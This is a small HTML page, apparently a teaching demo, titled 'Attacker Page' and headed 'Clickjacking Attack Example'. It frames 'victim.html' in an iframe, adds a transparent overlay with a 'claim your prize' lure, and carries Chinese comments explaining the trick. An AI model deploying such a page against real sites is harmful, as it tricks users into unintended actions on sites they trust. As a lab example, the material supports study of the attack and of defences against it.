<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Attacker Page</title>
    <style>
      body {
        margin: 0;
        overflow: hidden;
      }
      .cover {
        position: fixed;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        z-index: 1;
        background: rgba(255, 255, 255, 0); /* 透明覆盖 */
      }
      iframe {
        position: absolute;
        top: 50px; /* 假设攻击者诱导用户点击一个特定区域 */
        left: 50px;
        width: 400px;
        height: 300px;
        z-index: 2;
        pointer-events: auto; /* 确保点击事件传递到 iframe */
      }
    </style>
  </head>
  <body>
    <h1>Clickjacking Attack Example</h1>
    <div class="cover">Click here to claim your prize!</div>
    <iframe src="victim.html"></iframe>
  </body>
</html>
